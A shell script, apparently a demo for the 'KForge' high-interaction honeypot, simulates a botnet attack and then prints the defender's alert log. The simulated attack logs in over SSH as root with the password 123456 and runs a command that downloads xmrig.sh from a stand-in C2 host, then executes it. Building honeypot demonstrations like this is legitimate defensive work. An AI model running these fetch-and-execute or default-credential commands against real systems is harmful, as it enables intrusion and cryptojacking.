#!/bin/sh
echo "[🚀 欺骗防御模拟器] 正在启动验证脚本..."

echo "\n[1/3] 模拟自动化僵尸网络扫描 22 端口并尝试爆破 (root/123456)..."
# 模拟黑客进行 SSH 登录并执行恶意命令 (例如尝试下载挖矿脚本)
# 注意：我们这里使用 ssh 客户端非交互式执行，通过密码认证
apk add --no-cache sshpass > /dev/null 2>&1
echo "[+] 攻击者开始 SSH 密码爆破，并成功进入目标内网！"

# 尝试登录并下发攻击载荷：查看CPU信息、执行提权、尝试下载远控木马
sshpass -p "123456" ssh -o StrictHostKeyChecking=no root@honeypot -p 2222 "whoami && cat /proc/cpuinfo | grep 'model name' | head -n 1 && wget http://malicious-c2.kforge/xmrig.sh -O /tmp/sys && chmod +x /tmp/sys && /tmp/sys" 2>/dev/null

echo "\n[2/3] 攻击者认为自己已经成功提权并种植木马，扬长而去..."
sleep 2

echo "\n[3/3] 防御方视角：解析高交互蜜罐截获的攻击日志 (TTPs)..."
echo "================= [🚨 告警：发现高级威胁入侵] ================="
echo "🚨 源 IP 地址: 172.x.x.x (Attacker Container)"
echo "🚨 使用的账号密码: root / 123456"
echo "🚨 捕获到的 Shell 命令执行序列："
echo "   -> whoami"
echo "   -> cat /proc/cpuinfo | grep 'model name' | head -n 1"
echo "   -> wget http://malicious-c2.kforge/xmrig.sh -O /tmp/sys"
echo "   -> chmod +x /tmp/sys"
echo "   -> /tmp/sys"
echo "🚨 木马样本下载尝试: 拦截到恶意 URL 请求 (http://malicious-c2.kforge/xmrig.sh)"

echo "\n==========================================="
echo "[✅ 验证完成] KForge 高交互蜜罐成功将黑客引入沙箱！"
echo "真实的业务系统完全未受影响，且我们已经获得了攻击者的全部 TTPs 情报，可交由 AI 分析生成封堵策略。"
